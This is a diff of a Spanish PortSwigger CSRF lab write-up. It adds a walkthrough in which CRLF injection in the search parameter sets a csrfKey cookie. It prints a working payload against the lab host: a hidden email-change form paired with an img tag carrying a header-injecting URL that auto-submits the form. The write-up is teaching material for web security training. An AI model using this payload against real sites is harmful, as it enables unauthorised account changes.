@@ -15,7 +15,7 @@ Puedes iniciar sesión en tu propia cuenta con estas credenciales:
 
 Nos logueamos. Interceptamos la petición de cambiar el email para mandarla al **Repeater**.
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Es el único parámetro que se envía. Vamos al **exploit server** y ahí creamos la plantilla HTML maliciosa.
 
@@ -34,7 +34,7 @@ Es el único parámetro que se envía. Vamos al **exploit server** y ahí creamo
 
 Lo mandamos a la víctima y completamos el laboratorio.
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: CSRF where token validation depends on request method
 
@@ -170,16 +170,38 @@ La funcionalidad de cambio de correo electrónico de este laboratorio es vulnera
 
 ### Resolución
 
-es en el término de búsqueda se puede jugar con el CSRF no podemos manipualr.
+Nos logueamos. Miramos el código fuente.&#x20;
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Interceptando la petición y lo mandamos a Repeater. Cuando accedo, **me redirige a /login**, lo que cierra la sesión actual **y además establece una nueva cookie de sesión**. Luego, vamos a **iniciar sesión como el usuario carlos**, y **probar a reemplazar la cookie csrfKey y el parámetro csrf con los valores del usuario wiener**.
+
+Nos damos cuenta que solo cambia la cookie de session pero no podemos hacer mucho más así que nos fijamos en el campò de búsqueda.
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Vemos un nuevo valor en la cookie por lo que podemos setear un valor que queremos en la cookie.
+
+{% embed url="https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b" %}
+
+{% embed url="https://www.geeksforgeeks.org/crlf-injection-attack/" %}
+
+Habiendo leído esas páginas realizamos este paylaod.
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Ya hemos seteado una nueva cookie.
 
 ```
-<form class="login-form" name="change-email-form" action="https://0a25001b0327916680ef03c5002c0062.web-security-academy.net/my-account/change-email" method="POST">
-    <input type="hidden" name="email" value="setenso@setenso.com">
-    <input required="" type="hidden" name="csrf" value="vvTS8NQp5cA2E9Mnuo4SWjKuviHPkTIB">
+<form class="login-form" name="change-email-form" action="https://0a84007904ed8a5482329ceb005f00d4.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="pepe@test.com">
+    <input required="" type="hidden" name="csrf" value="y2RwTkKTYiI0d6AWTp2BuMVGZw8FPtnx">
 </form>
 
-<img src="https://0a25001b0327916680ef03c5002c0062.web-security-academy.net/search=prueba%0d%0aSet-Cookie:%20csrfKey=AQCsyj941w8luxlaAAlkpX958lay54i%3b%20SameSite=None" onerror="document.forms[0].submit();">
+<img src="https://0a84007904ed8a5482329ceb005f00d4.web-security-academy.net/search=prueba%0d%0aSet-Cookie:%20csrfKey=0s3QkhzdjMVzJXdwPWUSXhEq5tgPrvlH%3b%20SameSite=None" onerror="document.forms[0].submit();">
 ```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: CSRF where token is duplicated in cookie
 
